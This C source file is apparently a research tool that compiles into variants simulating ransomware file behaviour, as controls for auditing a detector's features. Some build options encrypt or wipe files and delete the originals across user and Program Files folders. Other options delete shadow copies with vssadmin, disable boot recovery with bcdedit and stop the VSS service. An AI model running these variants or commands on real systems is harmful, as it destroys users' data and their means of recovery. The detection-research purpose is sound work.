/*
 * hardneg_matrix.c - One program, compiled many ways, to vary a single
 * factor at a time.
 *
 * Why a matrix and not more samples
 * ---------------------------------
 * The feature audit kept reaching the same dead end. Removing everything
 * derived from the verdict, then holding activity constant on two separate
 * axes, left a handful of candidates whose meaning was still ambiguous:
 * ext_variety_all might measure indiscriminate targeting or might just
 * measure how many files were touched, and nothing in the ransomware set can
 * tell those apart, because there every run that touched many files also
 * encrypted them.
 *
 * Observation cannot separate factors that always move together. Only
 * building the cases where they come apart can. So each binary here differs
 * from the baseline in exactly one respect, and the feature that responds
 * to that change is the feature that was measuring it.
 *
 * The factors, and what each one is aimed at:
 *
 *   METHOD    how a file is transformed. Overwriting in place, writing a
 *             copy and removing the original, renaming without touching the
 *             contents, and folding many inputs into one output all produce
 *             different relations between the set read and the set written
 *             while touching the same files. If chain_* and rw_jaccard mean
 *             anything, they separate these; counts cannot.
 *
 *   SCOPE     where it looks. Real runs split into two kinds: those that
 *             reach the decoys in the user profile, and those that spend the
 *             whole ten minutes walking C:\ alphabetically and never get
 *             past Program Files. A hard negative confined to the decoys is
 *             not comparable to the second kind.
 *
 *   LIMIT     how many files. Same behaviour, different volume, which is the
 *             direct measurement of which features are counting rather than
 *             describing.
 *
 *   FILTER    which file types. The decoy set has no executables at all, so
 *             the selectivity a family shows by sparing them can only be
 *             tested against Program Files.
 *
 *   TIMING    how it is spread across the ten minutes. All at once, evenly,
 *             or in bursts with gaps between.
 *
 *   EFFECTS   which side behaviours accompany it, including the case of a
 *             program that does one of them and nothing else. A run that
 *             only drops a note and touches no other file should not be
 *             called encryption; if it is, that is a defect worth knowing
 *             about before the model is trained on the output.
 *
 * Nothing here is obfuscated or evasive. It is meant to be read, and every
 * behaviour it performs is one that ordinary software also performs.
 *
 * Build: see build_matrix.sh
 */

#ifndef METHOD
/*  1 overwrite in place          6 read, encrypt, write, delete original
 *  2 copy then delete            7 overwrite with random, then delete
 *  3 rename only                 8 copy, keep the original
 *  4 many files into one         9 move to another directory
 *  5 write without reading      10 scratch files, written then removed    */
#define METHOD 2
#endif
#ifndef RENAME_MODE
/* 0 keeps the original name and appends: report.docx -> report.docx.matrix
 * 1 discards it: report.docx -> Kf3Qz9x2.[processed]
 *
 * The second is not a variation for its own sake. One family in the set
 * renamed 4,908 files that way and registered nothing on the append check,
 * because that check asks whether the new path starts with the old one. The
 * extension axis was added to catch it. This is the control for that axis. */
#define RENAME_MODE 0
#endif
#ifndef BATCH
/* 1 reads every file before writing any of them. Correlating writes against
 * crypto calls within a time window assumes the two are interleaved; doing
 * all the reading first and all the writing second breaks that assumption
 * without changing a single count. */
#define BATCH 0
#endif
#ifndef GENERATE
/* Create this many files of its own and work on those instead of the decoys.
 * Volume can then be raised past what the guest holds, and raised without
 * the confound that touching more decoys also means touching more kinds of
 * file in more directories. */
#define GENERATE 0
#endif
#ifndef SCOPE
/* 1 user decoys   2 Program Files   3 walk C:\   4 AppData   5 mixed
 *
 * Where the destruction actually lands, measured across 400 ransomware
 * analyses: Program Files 66.8%, AppData 12.9%, other 11.6%, the decoy
 * folders 4.6%, elsewhere under Users 2.4%, Windows 1.7%. More than half of
 * the runs with any file activity never reached a decoy at all.
 *
 * Scopes 1 to 3 cover the first, third and fourth of those. AppData was
 * missing: walking from C:\ stops at depth four, and
 * C:\Users\admin\AppData\Roaming\<app> is deeper than that. Scope 5
 * spreads across several roots at once, which is what a family enumerating
 * drives actually does -- it does not pick one directory and stay there. */
#define SCOPE 1
#endif
#ifndef LIMIT
#define LIMIT 0         /* 0 = no limit */
#endif
#ifndef FILTER
#define FILTER 0        /* 0 all, 1 documents, 2 media, 3 executables */
#endif
#ifndef TIMING
#define TIMING 0        /* 0 burst, 1 spread over the window, 2 bursts with gaps */
#endif
#ifndef EFFECTS
#define EFFECTS 0       /* bitmask: 1 note, 2 wallpaper, 4 shadow, 8 recovery, 16 service */
#endif
#ifndef FILES_ONLY
#define FILES_ONLY 1    /* 0 = perform EFFECTS and no file transformation at all */
#endif

#define EFFECT_NOTE      1
#define EFFECT_WALLPAPER 2
#define EFFECT_SHADOW    4
#define EFFECT_RECOVERY  8
#define EFFECT_SERVICE   16

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_FILES      2000
#define MAX_DIRS       200
#define READ_CHUNK     65536
#define NEW_EXTENSION  ".matrix"
#define NOTE_NAME      "RESTORE_INSTRUCTIONS.txt"
#define WINDOW_MS      480000   /* leave headroom inside the 600s analysis */
#define GEN_DIR_NAME   "matrix_generated"
#define GEN_FILE_BYTES 32768
#define REPLACE_EXT    ".[processed]"

static const char *NOTE_TEXT =
    "This folder was processed by a behaviour matrix test.\r\n"
    "\r\n"
    "Nothing is encrypted and nothing is demanded. The file exists so that a\r\n"
    "detector looking for a note across many directories has one to find, in\r\n"
    "a run that is otherwise harmless.\r\n";

static const char *DOCUMENT_EXTS[] = {
    "doc","docx","xls","xlsx","ppt","pptx","pdf","txt","csv","rtf","odt","md", NULL };
static const char *MEDIA_EXTS[] = {
    "jpg","jpeg","png","gif","bmp","mp3","mp4","avi","mkv","wav","webp", NULL };
static const char *EXECUTABLE_EXTS[] = {
    "exe","dll","sys","ocx","cpl","scr","msi","drv", NULL };

static char g_files[MAX_FILES][MAX_PATH];
static int  g_file_count = 0;
static char g_dirs[MAX_DIRS][MAX_PATH];
static int  g_dir_count = 0;

static void say(const char *fmt, ...)
{
    va_list a; va_start(a, fmt); vprintf(fmt, a); va_end(a);
    printf("\n"); fflush(stdout);
}

static const char *ext_of(const char *name)
{
    const char *dot = strrchr(name, '.');
    return dot ? dot + 1 : "";
}

static int in_list(const char *ext, const char **list)
{
    for (int i = 0; list[i]; i++)
        if (_stricmp(ext, list[i]) == 0) return 1;
    return 0;
}

static int wanted(const char *name)
{
    const char *e = ext_of(name);
#if FILTER == 1
    return in_list(e, DOCUMENT_EXTS);
#elif FILTER == 2
    return in_list(e, MEDIA_EXTS);
#elif FILTER == 3
    return in_list(e, EXECUTABLE_EXTS);
#else
    (void)e; return 1;
#endif
}

static void remember_dir(const char *dir)
{
    if (g_dir_count >= MAX_DIRS) return;
    for (int i = 0; i < g_dir_count; i++)
        if (_stricmp(g_dirs[i], dir) == 0) return;
    strncpy(g_dirs[g_dir_count], dir, MAX_PATH - 1);
    g_dirs[g_dir_count][MAX_PATH - 1] = '\0';
    g_dir_count++;
}

static void walk(const char *dir, int depth, int max_depth)
{
    if (depth > max_depth || g_file_count >= MAX_FILES) return;

    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
    WIN32_FIND_DATAA found;
    HANDLE h = FindFirstFileA(pattern, &found);
    if (h == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(found.cFileName, ".") == 0 || strcmp(found.cFileName, "..") == 0)
            continue;
        char full[MAX_PATH];
        if (snprintf(full, sizeof(full), "%s\\%s", dir, found.cFileName)
                >= (int)sizeof(full))
            continue;

        if (found.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            walk(full, depth + 1, max_depth);
        } else if (g_file_count < MAX_FILES) {
            size_t len = strlen(found.cFileName);
            size_t ext = strlen(NEW_EXTENSION);
            if (len > ext && _stricmp(found.cFileName + len - ext, NEW_EXTENSION) == 0)
                continue;
            if (_stricmp(found.cFileName, NOTE_NAME) == 0) continue;
            if (!wanted(found.cFileName)) continue;
            strncpy(g_files[g_file_count], full, MAX_PATH - 1);
            g_files[g_file_count][MAX_PATH - 1] = '\0';
            g_file_count++;
            remember_dir(dir);
        }
    } while (FindNextFileA(h, &found) && g_file_count < MAX_FILES);
    FindClose(h);
}

static void collect(void)
{
    char dir[MAX_PATH];
#if SCOPE == 1
    const char *roots[] = { "%USERPROFILE%\\Desktop", "%USERPROFILE%\\Documents",
                            "%USERPROFILE%\\Downloads", "%USERPROFILE%\\Pictures", NULL };
    for (int i = 0; roots[i]; i++)
        if (ExpandEnvironmentStringsA(roots[i], dir, sizeof(dir)))
            walk(dir, 0, 3);
#elif SCOPE == 2
    const char *roots[] = { "C:\\Program Files", "C:\\Program Files (x86)", NULL };
    for (int i = 0; roots[i]; i++)
        walk(roots[i], 0, 3);
#elif SCOPE == 3
    /* Alphabetical from the root, the way a family that never reaches the
     * user profile inside ten minutes does. */
    walk("C:\\", 0, 4);
#elif SCOPE == 4
    /* Application data, which carries nearly an eighth of the destruction in
     * the ransomware set and is out of reach of the other scopes. */
    {
        const char *roots[] = { "%APPDATA%", "%LOCALAPPDATA%",
                                "%ProgramData%", NULL };
        for (int i = 0; roots[i]; i++)
            if (ExpandEnvironmentStringsA(roots[i], dir, sizeof(dir)))
                walk(dir, 0, 4);
    }
#else
    /* Several roots in one run, in roughly the proportion the ransomware set
     * distributes its destruction across them. Taking each in turn with its
     * own depth gives a mix rather than exhausting the first one and never
     * reaching the others, which is what a single deep walk does. */
    {
        struct { const char *root; int depth; } spread[] = {
            { "C:\\Program Files",  3 },
            { "%LOCALAPPDATA%",      3 },
            { "%USERPROFILE%\\Documents", 3 },
            { "%APPDATA%",           3 },
            { "%USERPROFILE%\\Desktop",   3 },
            { "C:\\ProgramData",    2 },
            { NULL, 0 }
        };
        for (int i = 0; spread[i].root; i++) {
            if (g_file_count >= MAX_FILES) break;
            if (ExpandEnvironmentStringsA(spread[i].root, dir, sizeof(dir)))
                walk(dir, 0, spread[i].depth);
        }
    }
#endif
}

static DWORD read_file(const char *path, BYTE *buf, DWORD cap)
{
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD got = 0;
    ReadFile(h, buf, cap, &got, NULL);
    CloseHandle(h);
    return got;
}

static int write_file(const char *path, const BYTE *buf, DWORD len)
{
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD n = 0;
    WriteFile(h, buf, len, &n, NULL);
    CloseHandle(h);
    return n == len;
}

/* Where a transformed file ends up, under whichever naming rule is built in. */
static void target_name(const char *source, char *out, size_t n)
{
#if RENAME_MODE == 1
    /* Nothing of the original survives except the directory it was in. */
    static unsigned int seed = 0;
    if (!seed) seed = GetTickCount();
    char stem[24];
    static const char alphabet[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < 16; i++) {
        seed = seed * 1103515245u + 12345u;
        stem[i] = alphabet[(seed >> 16) % (sizeof(alphabet) - 1)];
    }
    stem[16] = '\0';

    char dir[MAX_PATH];
    strncpy(dir, source, MAX_PATH - 1);
    dir[MAX_PATH - 1] = '\0';
    char *slash = strrchr(dir, '\\');
    if (slash) *slash = '\0'; else strcpy(dir, ".");
    snprintf(out, n, "%s\\%s%s", dir, stem, REPLACE_EXT);
#else
    snprintf(out, n, "%s%s", source, NEW_EXTENSION);
#endif
}

#if METHOD == 6
/* Real Windows cryptography, so that a feature looking for crypto calls has
 * some to find.
 *
 * This exists to be compared against METHOD 2, which performs the identical
 * sequence of file operations and skips only this step. Any feature that
 * separates the two is seeing the encryption; any feature that does not is
 * seeing the file operations and calling them encryption. On the ransomware
 * set that question could not be asked, because there was no pair of runs
 * that differed in this and nothing else. */
static int encrypt_buffer(BYTE *buf, DWORD *len, DWORD capacity)
{
    HCRYPTPROV provider = 0;
    HCRYPTHASH hash = 0;
    HCRYPTKEY key = 0;
    int ok = 0;

    if (!CryptAcquireContextA(&provider, NULL, NULL, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT))
        return 0;
    if (CryptCreateHash(provider, CALG_SHA_256, 0, 0, &hash)) {
        const char *secret = "matrix-experiment-key";
        if (CryptHashData(hash, (const BYTE *)secret, (DWORD)strlen(secret), 0) &&
            CryptDeriveKey(provider, CALG_AES_256, hash, 0, &key)) {
            DWORD n = *len;
            if (CryptEncrypt(key, 0, TRUE, 0, buf, &n, capacity)) {
                *len = n;
                ok = 1;
            }
            CryptDestroyKey(key);
        }
        CryptDestroyHash(hash);
    }
    CryptReleaseContext(provider, 0);
    return ok;
}
#endif

#if METHOD == 7
/* Overwrite with random bytes and remove: what sdelete does, and what a
 * wiper does. Contents are destroyed as thoroughly as encryption destroys
 * them, and no cryptographic call is made anywhere. */
static void fill_random(BYTE *buf, DWORD len)
{
    static unsigned int seed = 0;
    if (!seed) seed = GetTickCount() ^ 0x5bd1e995u;
    for (DWORD i = 0; i < len; i++) {
        seed = seed * 1103515245u + 12345u;
        buf[i] = (BYTE)(seed >> 16);
    }
}
#endif

#if GENERATE > 0
/* Work on files this program made, rather than the decoys.
 *
 * Volume and variety move together among the decoys -- reaching more files
 * means reaching more directories and more extensions -- so a feature that
 * responds to one cannot be told from a feature that responds to the other.
 * Files generated here are uniform, in one directory, so raising the count
 * raises nothing else. */
static void generate_files(void)
{
    char dir[MAX_PATH];
    if (!ExpandEnvironmentStringsA("%USERPROFILE%\\Documents\\" GEN_DIR_NAME,
                                    dir, sizeof(dir)))
        return;
    CreateDirectoryA(dir, NULL);

    BYTE *block = (BYTE *)malloc(GEN_FILE_BYTES);
    if (!block) return;
    for (int i = 0; i < GEN_FILE_BYTES; i++)
        block[i] = (BYTE)('A' + (i % 26));

    int made = 0;
    for (int i = 0; i < GENERATE && g_file_count < MAX_FILES; i++) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\gen_%05d.dat", dir, i);
        HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h == INVALID_HANDLE_VALUE) continue;
        DWORD n = 0;
        WriteFile(h, block, GEN_FILE_BYTES, &n, NULL);
        CloseHandle(h);
        strncpy(g_files[g_file_count], path, MAX_PATH - 1);
        g_files[g_file_count][MAX_PATH - 1] = '\0';
        g_file_count++;
        made++;
    }
    free(block);
    remember_dir(dir);
    say("generated %d files of its own", made);
}
#endif

static void run_command(const char *command)
{
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    char buf[512];
    strncpy(buf, command, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
    if (CreateProcessA(NULL, buf, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static void do_effects(void)
{
#if (EFFECTS & EFFECT_NOTE)
    {
        int n = 0;
        for (int i = 0; i < g_dir_count; i++) {
            char p[MAX_PATH];
            snprintf(p, sizeof(p), "%s\\%s", g_dirs[i], NOTE_NAME);
            if (write_file(p, (const BYTE *)NOTE_TEXT, (DWORD)strlen(NOTE_TEXT))) n++;
        }
        say("effect note: written into %d directories", n);
    }
#endif
#if (EFFECTS & EFFECT_WALLPAPER)
    {
        char p[MAX_PATH];
        if (ExpandEnvironmentStringsA("%TEMP%\\matrix_wallpaper.bmp", p, sizeof(p))) {
            BYTE bmp[] = {
                0x42,0x4D,0x46,0,0,0,0,0,0,0,0x36,0,0,0,0x28,0,0,0,
                0x02,0,0,0,0x02,0,0,0,0x01,0,0x18,0,0,0,0,0,0x10,0,0,0,
                0x13,0x0B,0,0,0x13,0x0B,0,0,0,0,0,0,0,0,0,0,
                0x20,0x20,0x20,0x20,0x20,0x20,0,0, 0x20,0x20,0x20,0x20,0x20,0x20,0,0 };
            write_file(p, bmp, sizeof(bmp));
            SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, p,
                                  SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            say("effect wallpaper: set");
        }
    }
#endif
#if (EFFECTS & EFFECT_SHADOW)
    run_command("cmd.exe /c vssadmin.exe delete shadows /all /quiet");
    say("effect shadow: requested");
#endif
#if (EFFECTS & EFFECT_RECOVERY)
    run_command("cmd.exe /c bcdedit.exe /set {default} recoveryenabled no");
    say("effect recovery: requested");
#endif
#if (EFFECTS & EFFECT_SERVICE)
    run_command("cmd.exe /c net stop VSS");
    say("effect service: requested");
#endif
}

int main(void)
{
    say("matrix: method=%d scope=%d limit=%d filter=%d timing=%d effects=%d "
        "files=%d rename=%d batch=%d generate=%d",
        METHOD, SCOPE, LIMIT, FILTER, TIMING, EFFECTS, FILES_ONLY,
        RENAME_MODE, BATCH, GENERATE);
    Sleep(3000);

#if GENERATE > 0
    generate_files();
#else
    collect();
#endif
#if LIMIT > 0
    if (g_file_count > LIMIT) g_file_count = LIMIT;
#endif
    say("found %d files in %d directories", g_file_count, g_dir_count);

#if FILES_ONLY == 0
    /* Side behaviours with no file transformation at all: the case that asks
     * whether any single axis is enough on its own. Directories still have
     * to be known for a note to go anywhere, so collection still ran. */
    do_effects();
    say("done");
    return 0;
#else

    BYTE *buf = (BYTE *)malloc(READ_CHUNK);
    if (!buf) return 1;

    int did_read = 0, did_write = 0, did_delete = 0, did_move = 0;

#if METHOD == 4
    /* Many inputs, one output: an archive. Every source is read, one file is
     * written, and the sources are removed -- the shape 7z -sdel produces,
     * where the set written bears no resemblance in size to the set read. */
    char out_path[MAX_PATH];
    if (!ExpandEnvironmentStringsA("%USERPROFILE%\\Desktop\\matrix_archive.bin",
                                    out_path, sizeof(out_path)))
        strcpy(out_path, "C:\\matrix_archive.bin");
    HANDLE out = CreateFileA(out_path, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
#endif

#if TIMING == 1
    DWORD per_file_pause = 0;
    if (g_file_count > 0) per_file_pause = WINDOW_MS / (DWORD)g_file_count;
#endif

#if BATCH == 1
    /* Everything is read first, then everything is written. The counts are
     * unchanged; only the interleaving is gone. */
    {
        int scanned = 0;
        for (int i = 0; i < g_file_count; i++)
            if (read_file(g_files[i], buf, READ_CHUNK)) scanned++;
        say("batch: read %d files before writing any", scanned);
        did_read = scanned;
    }
#endif

    for (int i = 0; i < g_file_count; i++) {
        const char *path = g_files[i];

#if METHOD == 5
        /* Writes files it never read: a dropper, or an installer. */
        char dropped[MAX_PATH];
        target_name(path, dropped, sizeof(dropped));
        if (write_file(dropped, (const BYTE *)NOTE_TEXT,
                       (DWORD)strlen(NOTE_TEXT))) did_write++;
#elif METHOD == 10
        /* Scratch files: written, used, removed. A compiler emitting object
         * files, a converter staging output, an installer unpacking before it
         * commits.
         *
         * Write and delete counts as high as an encrypting run produces, and
         * nothing that was there before is touched. No other variant has this
         * shape: METHOD 5 writes without deleting, and everything that deletes
         * is deleting something it did not create. */
        {
            char scratch[MAX_PATH];
            for (int k = 0; k < 3; k++) {
                snprintf(scratch, sizeof(scratch), "%s.tmp%d", path, k);
                if (write_file(scratch, (const BYTE *)NOTE_TEXT,
                               (DWORD)strlen(NOTE_TEXT))) {
                    did_write++;
                    if (DeleteFileA(scratch)) did_delete++;
                }
            }
        }

#elif METHOD == 9
        {
            char dest_dir[MAX_PATH], dest[MAX_PATH];
            if (ExpandEnvironmentStringsA("%USERPROFILE%\\Desktop\\matrix_moved",
                                           dest_dir, sizeof(dest_dir))) {
                CreateDirectoryA(dest_dir, NULL);
                const char *base = strrchr(path, '\\');
                snprintf(dest, sizeof(dest), "%s\\%s", dest_dir,
                         base ? base + 1 : path);
                if (MoveFileA(path, dest)) did_move++;
            }
        }
#else
        DWORD len = read_file(path, buf, READ_CHUNK);
        if (!len) continue;
        did_read++;

#if METHOD == 1
        /* Same bytes back over the same path: an editor saving an unchanged
         * file, or EFS turning on encryption in place. */
        if (write_file(path, buf, len)) did_write++;

#elif METHOD == 2
        /* A replacement beside the original, then the original removed. */
        {
            char replacement[MAX_PATH];
            target_name(path, replacement, sizeof(replacement));
            if (write_file(replacement, buf, len)) {
                did_write++;
                if (DeleteFileA(path)) did_delete++;
            }
        }

#elif METHOD == 3
        /* Only the name changes; the bytes are never rewritten. A bulk
         * rename utility, or a script marking files as processed. */
        {
            char renamed[MAX_PATH];
            target_name(path, renamed, sizeof(renamed));
            if (MoveFileA(path, renamed)) did_move++;
        }

#elif METHOD == 4
        if (out != INVALID_HANDLE_VALUE) {
            DWORD n = 0;
            WriteFile(out, buf, len, &n, NULL);
            if (DeleteFileA(path)) did_delete++;
        }

#elif METHOD == 6
        /* The same shape as METHOD 2, with the contents encrypted on the way
         * through. The pair is the experiment. */
        {
            DWORD out_len = len;
            if (!encrypt_buffer(buf, &out_len, READ_CHUNK)) out_len = len;
            char replacement[MAX_PATH];
            target_name(path, replacement, sizeof(replacement));
            if (write_file(replacement, buf, out_len)) {
                did_write++;
                if (DeleteFileA(path)) did_delete++;
            }
        }

#elif METHOD == 7
        /* Contents replaced with random bytes in place, then removed. As
         * destructive as encryption, with no cryptography anywhere. */
        {
            fill_random(buf, len);
            if (write_file(path, buf, len)) {
                did_write++;
                if (DeleteFileA(path)) did_delete++;
            }
        }

#elif METHOD == 8
        /* A copy beside the original, which stays. Reads and writes the same
         * as METHOD 2 and destroys nothing: the non-destructive control. */
        {
            char copy_path[MAX_PATH];
            target_name(path, copy_path, sizeof(copy_path));
            if (write_file(copy_path, buf, len)) did_write++;
        }

#endif
#endif /* METHOD == 5 */

#if TIMING == 1
        if (per_file_pause) Sleep(per_file_pause);
#elif TIMING == 2
        /* Bursts of twenty with a pause between, the way a batch job runs. */
        if (i > 0 && (i % 20) == 0) Sleep(15000);
#endif
    }

#if METHOD == 4
    if (out != INVALID_HANDLE_VALUE) { CloseHandle(out); did_write = 1; }
#endif

    free(buf);
    say("read=%d write=%d delete=%d move=%d", did_read, did_write, did_delete, did_move);
    do_effects();
    say("done");
    return 0;
#endif /* FILES_ONLY */
}
